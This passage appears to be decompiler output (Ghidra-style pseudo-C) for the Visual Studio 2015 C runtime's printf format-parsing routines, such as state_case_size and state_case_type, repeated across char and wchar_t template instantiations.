    uVar2 = parse_int_from_format_string(param_1,(long *)((int)param_1 + 0x28));
    return uVar2;
  }
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  iVar1 = *(int *)(*(int *)((int)param_1 + 0x14) + -4);
  *(int *)((int)param_1 + 0x28) = iVar1;
  if (iVar1 < 0) {
    *(undefined4 *)((int)param_1 + 0x28) = 0xffffffff;
  }
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::state_case_precision(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_precision(void)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall state_case_precision(void *param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (*(short *)((int)param_1 + 0x32) != 0x2a) {
    uVar2 = parse_int_from_format_string(param_1,(long *)((int)param_1 + 0x28));
    return uVar2;
  }
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  iVar1 = *(int *)(*(int *)((int)param_1 + 0x14) + -4);
  *(int *)((int)param_1 + 0x28) = iVar1;
  if (iVar1 < 0) {
    *(undefined4 *)((int)param_1 + 0x28) = 0xffffffff;
  }
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_size(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_size(void)
// 
// Library: Visual Studio 2015 Release

bool __fastcall state_case_size(uint *param_1)

{
  char cVar1;
  char *pcVar2;
  bool bVar3;
  int *piVar4;
  
  cVar1 = *(char *)((int)param_1 + 0x31);
  if (cVar1 == 'F') {
    if ((*param_1 & 8) == 0) {
      param_1[7] = 7;
      bVar3 = __crt_stdio_output::
              output_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_>
              ::state_case_type((output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                                 *)param_1);
      return bVar3;
    }
  }
  else if (cVar1 == 'N') {
    if ((*param_1 & 8) == 0) {
      param_1[7] = 8;
LAB_004055e8:
      piVar4 = __errno();
      *piVar4 = 0x16;
      FUN_004091be();
      return false;
    }
  }
  else {
    if (param_1[0xb] != 0) goto LAB_004055e8;
    if (cVar1 < 'k') {
      if (cVar1 == 'j') {
        param_1[0xb] = 5;
      }
      else if (cVar1 == 'I') {
        pcVar2 = (char *)param_1[4];
        cVar1 = *pcVar2;
        if ((cVar1 == '3') && (pcVar2[1] == '2')) {
          param_1[0xb] = 10;
          param_1[4] = (uint)(pcVar2 + 2);
        }
        else if ((cVar1 == '6') && (pcVar2[1] == '4')) {
          param_1[0xb] = 0xb;
          param_1[4] = (uint)(pcVar2 + 2);
        }
        else if ((((cVar1 == 'd') || (cVar1 == 'i')) || (cVar1 == 'o')) ||
                (((cVar1 == 'u' || (cVar1 == 'x')) || (cVar1 == 'X')))) {
          param_1[0xb] = 9;
        }
      }
      else if (cVar1 == 'L') {
        param_1[0xb] = 8;
      }
      else if (cVar1 == 'T') {
        param_1[0xb] = 0xd;
      }
      else if (cVar1 == 'h') {
        if (*(char *)param_1[4] == 'h') {
          param_1[0xb] = 1;
          param_1[4] = (uint)((char *)param_1[4] + 1);
        }
        else {
          param_1[0xb] = 2;
        }
      }
    }
    else if (cVar1 == 'l') {
      if (*(char *)param_1[4] == 'l') {
        param_1[0xb] = 4;
        param_1[4] = (uint)((char *)param_1[4] + 1);
      }
      else {
        param_1[0xb] = 3;
      }
    }
    else if (cVar1 == 't') {
      param_1[0xb] = 7;
    }
    else if (cVar1 == 'w') {
      param_1[0xb] = 0xc;
    }
    else if (cVar1 == 'z') {
      param_1[0xb] = 6;
    }
  }
  return true;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_size(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_size(void)
// 
// Library: Visual Studio 2015 Release

bool __fastcall state_case_size(uint *param_1)

{
  char cVar1;
  char *pcVar2;
  bool bVar3;
  int *piVar4;
  
  cVar1 = *(char *)((int)param_1 + 0x31);
  if (cVar1 == 'F') {
    if ((*param_1 & 8) == 0) {
      param_1[7] = 7;
      bVar3 = __crt_stdio_output::
              output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>
              ::state_case_type((output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                                 *)param_1);
      return bVar3;
    }
  }
  else if (cVar1 == 'N') {
    if ((*param_1 & 8) == 0) {
      param_1[7] = 8;
LAB_00405751:
      piVar4 = __errno();
      *piVar4 = 0x16;
      FUN_004091be();
      return false;
    }
  }
  else {
    if (param_1[0xb] != 0) goto LAB_00405751;
    if (cVar1 < 'k') {
      if (cVar1 == 'j') {
        param_1[0xb] = 5;
      }
      else if (cVar1 == 'I') {
        pcVar2 = (char *)param_1[4];
        cVar1 = *pcVar2;
        if ((cVar1 == '3') && (pcVar2[1] == '2')) {
          param_1[0xb] = 10;
          param_1[4] = (uint)(pcVar2 + 2);
        }
        else if ((cVar1 == '6') && (pcVar2[1] == '4')) {
          param_1[0xb] = 0xb;
          param_1[4] = (uint)(pcVar2 + 2);
        }
        else if ((((cVar1 == 'd') || (cVar1 == 'i')) || (cVar1 == 'o')) ||
                (((cVar1 == 'u' || (cVar1 == 'x')) || (cVar1 == 'X')))) {
          param_1[0xb] = 9;
        }
      }
      else if (cVar1 == 'L') {
        param_1[0xb] = 8;
      }
      else if (cVar1 == 'T') {
        param_1[0xb] = 0xd;
      }
      else if (cVar1 == 'h') {
        if (*(char *)param_1[4] == 'h') {
          param_1[0xb] = 1;
          param_1[4] = (uint)((char *)param_1[4] + 1);
        }
        else {
          param_1[0xb] = 2;
        }
      }
    }
    else if (cVar1 == 'l') {
      if (*(char *)param_1[4] == 'l') {
        param_1[0xb] = 4;
        param_1[4] = (uint)((char *)param_1[4] + 1);
      }
      else {
        param_1[0xb] = 3;
      }
    }
    else if (cVar1 == 't') {
      param_1[0xb] = 7;
    }
    else if (cVar1 == 'w') {
      param_1[0xb] = 0xc;
    }
    else if (cVar1 == 'z') {
      param_1[0xb] = 6;
    }
  }
  return true;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::state_case_size(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_size(void)
// 
// Library: Visual Studio 2015 Release

bool __fastcall state_case_size(uint *param_1)

{
  ushort uVar1;
  short sVar2;
  short *psVar3;
  bool bVar4;
  int *piVar5;
  
  uVar1 = *(ushort *)((int)param_1 + 0x32);
  if (uVar1 == 0x46) {
    if ((*param_1 & 8) == 0) {
      param_1[7] = 7;
      bVar4 = __crt_stdio_output::
              output_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_>
              ::state_case_type((output_processor_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t__class___crt_stdio_output__standard_base_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t_____
                                 *)param_1);
      return bVar4;
    }
  }
  else if (uVar1 == 0x4e) {
    if ((*param_1 & 8) == 0) {
      param_1[7] = 8;
LAB_004058bd:
      piVar5 = __errno();
      *piVar5 = 0x16;
      FUN_004091be();
      return false;
    }
  }
  else {
    if (param_1[0xb] != 0) goto LAB_004058bd;
    if (uVar1 < 0x6b) {
      if (uVar1 == 0x6a) {
        param_1[0xb] = 5;
      }
      else if (uVar1 == 0x49) {
        psVar3 = (short *)param_1[4];
        sVar2 = *psVar3;
        if ((sVar2 == 0x33) && (psVar3[1] == 0x32)) {
          param_1[0xb] = 10;
          param_1[4] = (uint)(psVar3 + 2);
        }
        else if ((sVar2 == 0x36) && (psVar3[1] == 0x34)) {
          param_1[0xb] = 0xb;
          param_1[4] = (uint)(psVar3 + 2);
        }
        else if ((((sVar2 == 100) || (sVar2 == 0x69)) || (sVar2 == 0x6f)) ||
                (((sVar2 == 0x75 || (sVar2 == 0x78)) || (sVar2 == 0x58)))) {
          param_1[0xb] = 9;
        }
      }
      else if (uVar1 == 0x4c) {
        param_1[0xb] = 8;
      }
      else if (uVar1 == 0x54) {
        param_1[0xb] = 0xd;
      }
      else if (uVar1 == 0x68) {
        if (*(short *)param_1[4] == 0x68) {
          param_1[0xb] = 1;
          param_1[4] = (uint)((short *)param_1[4] + 1);
        }
        else {
          param_1[0xb] = 2;
        }
      }
    }
    else if (uVar1 == 0x6c) {
      if (*(short *)param_1[4] == 0x6c) {
        param_1[0xb] = 4;
        param_1[4] = (uint)((short *)param_1[4] + 1);
      }
      else {
        param_1[0xb] = 3;
      }
    }
    else if (uVar1 == 0x74) {
      param_1[0xb] = 7;
    }
    else if (uVar1 == 0x77) {
      param_1[0xb] = 0xc;
    }
    else if (uVar1 == 0x7a) {
      param_1[0xb] = 6;
    }
  }
  return true;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_type(void)
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_stdio_output::
output_processor<char,class___crt_stdio_output::stream_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::stream_output_adapter<char>_>_>
::state_case_type(output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                  *this)

{
  int *piVar1;
  output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
  oVar2;
  bool bVar3;
  char cVar4;
  undefined4 uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  undefined4 local_8;
  
  iVar6 = 1;
  oVar2 = this[0x31];
  local_8 = this;
  if ((char)oVar2 < 'e') {
    if (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                  )0x64) {
LAB_00405aaf:
      *(uint *)(this + 0x20) = *(uint *)(this + 0x20) | 0x10;
      goto LAB_00405ab3;
    }
    if ('X' < (char)oVar2) {
      if (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                    )0x5a) {
        uVar5 = type_case_Z((__uint64 *)this);
        cVar4 = (char)uVar5;
        goto LAB_00405a4b;
      }
      if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                    )0x61) {
        if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                      )0x63) {
          return false;
        }
LAB_00405a6f:
        uVar5 = type_case_c_tchar((__uint64 *)this);
        cVar4 = (char)uVar5;
        goto LAB_00405a4b;
      }
LAB_00405abf:
      uVar5 = type_case_a((uint *)this);
      cVar4 = (char)uVar5;
      goto LAB_00405a4b;
    }
    if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                  )0x58) {
      if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                    )0x41) {
        if (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                      )0x43) goto LAB_00405a6f;
        if ((char)oVar2 < 'E') {
          return false;
        }
        if ('G' < (char)oVar2) {
          if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                        )0x53) {
            return false;
          }
          goto LAB_00405a44;
        }
      }
      goto LAB_00405abf;
    }
    cVar4 = '\x01';
LAB_00405a5b:
    uVar8 = 0x10;
  }
  else {
    if ((char)oVar2 < 'q') {
      if (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                    )0x70) {
        cVar4 = type_case_p(this);
        goto LAB_00405a4b;
      }
      if ((char)oVar2 < 'h') goto LAB_00405abf;
      if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                    )0x69) {
        if (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                      )0x6e) {
          uVar8 = type_case_n((int)this);
          cVar4 = (char)uVar8;
        }
        else {
          if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                        )0x6f) {
            return false;
          }
          cVar4 = type_case_o(this);
        }
        goto LAB_00405a4b;
      }
      goto LAB_00405aaf;
    }
    if (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                  )0x73) {
LAB_00405a44:
      uVar5 = type_case_s((__uint64 *)this);
      cVar4 = (char)uVar5;
      goto LAB_00405a4b;
    }
    if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                  )0x75) {
      if (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                    )0x78) {
        return false;
      }
      cVar4 = '\0';
      goto LAB_00405a5b;
    }
LAB_00405ab3:
    cVar4 = '\0';
    uVar8 = 10;
  }
  uVar8 = type_case_integer(this,uVar8,cVar4);
  cVar4 = (char)uVar8;
LAB_00405a4b:
  if (cVar4 == '\0') {
    return false;
  }
  if (this[0x30] !=
      (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
       )0x0) {
    return true;
  }
  uVar8 = *(uint *)(this + 0x20);
  local_8 = (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
             *)(((uint)local_8 >> 0x10 & 0xff00) << 0x10);
  iVar7 = 0;
  if ((uVar8 >> 4 & 1) != 0) {
    local_8._1_3_ = (undefined3)((uint)local_8 >> 8);
    iVar7 = iVar6;
    if ((uVar8 >> 6 & 1) == 0) {
      if ((uVar8 & 1) == 0) {
        iVar7 = 0;
        if ((uVar8 >> 1 & 1) != 0) {
          local_8 = (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                     *)CONCAT31(local_8._1_3_,0x20);
          iVar7 = iVar6;
        }
      }
      else {
        local_8 = (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                   *)CONCAT31(local_8._1_3_,0x2b);
      }
    }
    else {
      local_8 = (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                 *)CONCAT31(local_8._1_3_,0x2d);
    }
  }
  oVar2 = this[0x31];
  if (((oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                  )0x78) &&
      (oVar2 != (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                 )0x58)) || ((uVar8 >> 5 & 1) == 0)) {
    iVar6 = 0;
  }
  if ((oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                 )0x61) ||
     (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                )0x41)) {
    bVar3 = true;
  }
  else {
    bVar3 = false;
  }
  if (((char)iVar6 != '\0') || (bVar3)) {
    *(undefined *)((int)&local_8 + iVar7) = 0x30;
    if ((oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                   )0x58) ||
       (oVar2 == (output_processor_char_class___crt_stdio_output__stream_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__stream_output_adapter_char_____
                  )0x41)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    *(byte *)((int)&local_8 + iVar7 + 1) = (!bVar3 - 1U & 0xe0) + 0x78;
    iVar7 = iVar7 + 2;
  }
  iVar6 = (*(int *)(this + 0x24) - *(int *)(this + 0x38)) - iVar7;
  if ((uVar8 & 0xc) == 0) {
    write_multiple_characters_class___crt_stdio_output__stream_output_adapter_char__char_
              ((stream_output_adapter_char_ *)(this + 0x448),' ',iVar6,(int *)(this + 0x18));
  }
  stream_output_adapter<char>::write_string
            ((stream_output_adapter_char_ *)(this + 0x448),(char *)&local_8,iVar7,
             (int *)(this + 0x18),*(int **)(this + 0xc));
  piVar1 = (int *)(this + 0x18);
  if (((*(uint *)(this + 0x20) >> 3 & 1) != 0) && ((*(uint *)(this + 0x20) >> 2 & 1) == 0)) {
    write_multiple_characters_class___crt_stdio_output__stream_output_adapter_char__char_
              ((stream_output_adapter_char_ *)(this + 0x448),'0',iVar6,piVar1);
  }
  write_stored_string_tchar((int)this);
  if ((-1 < *piVar1) && ((*(uint *)(this + 0x20) >> 2 & 1) != 0)) {
    write_multiple_characters_class___crt_stdio_output__stream_output_adapter_char__char_
              ((stream_output_adapter_char_ *)(this + 0x448),' ',iVar6,piVar1);
  }
  return true;
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_type(void)
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_stdio_output::
output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::standard_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>
::state_case_type(output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                  *this)

{
  int *piVar1;
  output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
  oVar2;
  bool bVar3;
  char cVar4;
  undefined4 uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  undefined4 local_8;
  
  iVar6 = 1;
  oVar2 = this[0x31];
  local_8 = this;
  if ((char)oVar2 < 'e') {
    if (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                  )0x64) {
LAB_00405cde:
      *(uint *)(this + 0x20) = *(uint *)(this + 0x20) | 0x10;
      goto LAB_00405ce2;
    }
    if ('X' < (char)oVar2) {
      if (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                    )0x5a) {
        uVar5 = type_case_Z((__uint64 *)this);
        cVar4 = (char)uVar5;
        goto LAB_00405c7a;
      }
      if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                    )0x61) {
        if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                      )0x63) {
          return false;
        }
LAB_00405c9e:
        uVar5 = type_case_c_tchar((__uint64 *)this);
        cVar4 = (char)uVar5;
        goto LAB_00405c7a;
      }
LAB_00405cee:
      uVar5 = type_case_a((uint *)this);
      cVar4 = (char)uVar5;
      goto LAB_00405c7a;
    }
    if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                  )0x58) {
      if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                    )0x41) {
        if (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                      )0x43) goto LAB_00405c9e;
        if ((char)oVar2 < 'E') {
          return false;
        }
        if ('G' < (char)oVar2) {
          if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                        )0x53) {
            return false;
          }
          goto LAB_00405c73;
        }
      }
      goto LAB_00405cee;
    }
    cVar4 = '\x01';
LAB_00405c8a:
    uVar8 = 0x10;
  }
  else {
    if ((char)oVar2 < 'q') {
      if (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                    )0x70) {
        cVar4 = type_case_p(this);
        goto LAB_00405c7a;
      }
      if ((char)oVar2 < 'h') goto LAB_00405cee;
      if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                    )0x69) {
        if (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                      )0x6e) {
          uVar8 = type_case_n((int)this);
          cVar4 = (char)uVar8;
        }
        else {
          if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                        )0x6f) {
            return false;
          }
          cVar4 = type_case_o(this);
        }
        goto LAB_00405c7a;
      }
      goto LAB_00405cde;
    }
    if (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                  )0x73) {
LAB_00405c73:
      uVar5 = type_case_s((__uint64 *)this);
      cVar4 = (char)uVar5;
      goto LAB_00405c7a;
    }
    if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                  )0x75) {
      if (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                    )0x78) {
        return false;
      }
      cVar4 = '\0';
      goto LAB_00405c8a;
    }
LAB_00405ce2:
    cVar4 = '\0';
    uVar8 = 10;
  }
  uVar8 = type_case_integer(this,uVar8,cVar4);
  cVar4 = (char)uVar8;
LAB_00405c7a:
  if (cVar4 == '\0') {
    return false;
  }
  if (this[0x30] !=
      (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
       )0x0) {
    return true;
  }
  uVar8 = *(uint *)(this + 0x20);
  local_8 = (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
             *)(((uint)local_8 >> 0x10 & 0xff00) << 0x10);
  iVar7 = 0;
  if ((uVar8 >> 4 & 1) != 0) {
    local_8._1_3_ = (undefined3)((uint)local_8 >> 8);
    iVar7 = iVar6;
    if ((uVar8 >> 6 & 1) == 0) {
      if ((uVar8 & 1) == 0) {
        iVar7 = 0;
        if ((uVar8 >> 1 & 1) != 0) {
          local_8 = (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                     *)CONCAT31(local_8._1_3_,0x20);
          iVar7 = iVar6;
        }
      }
      else {
        local_8 = (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                   *)CONCAT31(local_8._1_3_,0x2b);
      }
    }
    else {
      local_8 = (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                 *)CONCAT31(local_8._1_3_,0x2d);
    }
  }
  oVar2 = this[0x31];
  if (((oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                  )0x78) &&
      (oVar2 != (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                 )0x58)) || ((uVar8 >> 5 & 1) == 0)) {
    iVar6 = 0;
  }
  if ((oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                 )0x61) ||
     (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                )0x41)) {
    bVar3 = true;
  }
  else {
    bVar3 = false;
  }
  if (((char)iVar6 != '\0') || (bVar3)) {
    *(undefined *)((int)&local_8 + iVar7) = 0x30;
    if ((oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                   )0x58) ||
       (oVar2 == (output_processor_char_class___crt_stdio_output__string_output_adapter_char__class___crt_stdio_output__standard_base_char_class___crt_stdio_output__string_output_adapter_char_____
                  )0x41)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    *(byte *)((int)&local_8 + iVar7 + 1) = (!bVar3 - 1U & 0xe0) + 0x78;
    iVar7 = iVar7 + 2;
  }
  iVar6 = (*(int *)(this + 0x24) - *(int *)(this + 0x38)) - iVar7;
  if ((uVar8 & 0xc) == 0) {
    write_multiple_characters_class___crt_stdio_output__string_output_adapter_char__char_
              ((string_output_adapter_char_ *)(this + 0x448),' ',iVar6,(int *)(this + 0x18));
  }
  string_output_adapter<char>::write_string
            ((string_output_adapter_char_ *)(this + 0x448),(char *)&local_8,iVar7,
             (int *)(this + 0x18),*(int **)(this + 0xc));
  piVar1 = (int *)(this + 0x18);
  if (((*(uint *)(this + 0x20) >> 3 & 1) != 0) && ((*(uint *)(this + 0x20) >> 2 & 1) == 0)) {
    write_multiple_characters_class___crt_stdio_output__string_output_adapter_char__char_
              ((string_output_adapter_char_ *)(this + 0x448),'0',iVar6,piVar1);
  }
  write_stored_string_tchar((int)this);
  if ((-1 < *piVar1) && ((*(uint *)(this + 0x20) >> 2 & 1) != 0)) {
    write_multiple_characters_class___crt_stdio_output__string_output_adapter_char__char_
              ((string_output_adapter_char_ *)(this + 0x448),' ',iVar6,piVar1);
  }
  return true;
}



// Library Function - Single Match
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_type(void)
// 
// Library: Visual Studio 2015 Release

bool __thiscall
__crt_stdio_output::
